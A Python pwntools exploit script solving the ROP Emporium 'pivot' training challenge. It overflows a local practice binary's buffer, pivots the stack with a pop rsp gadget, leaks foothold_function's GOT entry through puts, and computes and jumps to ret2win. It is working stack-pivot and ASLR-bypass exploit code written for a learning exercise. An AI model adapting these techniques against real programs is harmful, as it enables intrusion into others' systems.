#!/usr/bin/python

# created for the ROP Emporium challenge "pivot"
# this challenge focuses on using a stack pivot in order to obtain more space
# for a ROP chain
# a notable component of the exploit is calling foothold_function() to populate
# the .got.plt entry, then calling puts() on the .got entry extracted via
# objdump in order to leak the populated address of foothold_function()
# and therefore calculate the address of ret2win()

from pwn import *
import struct

p = process("./pivot")

# extract address from contrived info leak to know where to stack pivot
data = p.recv()
data = data.split("\n")
data = data[4]
data = data.split(": ")
data = data[1]
data = int(data,16)

# gadgets
leaked_stack = struct.pack("Q",data)
print "Leaked stack pivot point is ",hex(data)

pop_rdi = struct.pack("Q",0x00400b73) # pop rdi; ret;
main_address = struct.pack("Q",0x0000000000400996)
# use the below gadget for stack pivoting; set up junk for other registers
pop_rsp = struct.pack("Q",0x00400b6d) # pop rsp; pop r13; pop r14; pop r15; ret;

# offset of 0x14e between foothold_function() and ret2win()
# (can be calculated using GDB and printing addresses of both functions)
foothold_plt = struct.pack("Q",0x400850)
foothold_got = struct.pack("Q",0x602048)
puts_plt = struct.pack("Q",0x400800)

# the primary rop chain after the pivot; this input provided first
# first use junk to fill the registers from the pivot gadget, since the stack pivot
# occurs immediately after rsp is changed
payload = "whatever" * 3

# call foothold_plt to populat the .got.plt entry for it
payload += foothold_plt

# now call puts() on the got address to leak the real address of foothold_function()
payload += pop_rdi
payload += foothold_got
payload += puts_plt

# with the leak performed and the offset calculated (see below), main() should be called
# to trigger the overflow a second time
payload += main_address

# offset at 40 bytes
# now the stack smash prompt appears
# send overflow with stack pivot gadgets
stack_smash = "A" * 40
# pivot the stack and fill other registers with junk
stack_smash += pop_rsp
stack_smash += leaked_stack

# now actually send the content
p.sendline(payload)
print p.recv()
p.sendline(stack_smash)

# extract the leaked address obtained through puts()
second_leak = p.recv()
print second_leak
second_leak = second_leak.split("\n")
second_leak = second_leak[0]
second_leak = second_leak[84::]

# pad out the leading null bytes, since extracted address
# will only be 6 bytes
second_leak = second_leak.ljust(8,"\x00")
second_leak = struct.unpack("Q",second_leak)
second_leak = hex(second_leak[0])

# address of ret2win should be second_leak + 0x14e
print "second leak is ",second_leak
second_leak = int(second_leak,16)
second_leak = second_leak + 0x14e
second_leak = hex(second_leak)
print "address of ret2win is ",second_leak
ret2win = struct.pack("Q",int(second_leak,16))

# main will get called a second time now
# set up our new stack with call to ret2win
# don't forget to pad out the registers with junk again
# to accommodate the stack pivot gadget
# I think execution doesn't actually ever get redirected here
# via the pivot, and instead goes into the second stack smash buffer
second_chain = "whatever" * 3
second_chain += ret2win
p.sendline(second_chain)
print p.recv()

# finally, smash the stack one more time
# should redirect rsp to the new rop chain
# the second time, execution will end up in the stack smash
# input, 32 bytes in, which is enough to call ret2win()
second_stack_smash = "A" * 32 + ret2win
second_stack_smash += pop_rsp
second_stack_smash += leaked_stack

# trigger the second stack pivot to the ret2win() function
p.sendline(second_stack_smash)

print p.recv()

p.close()
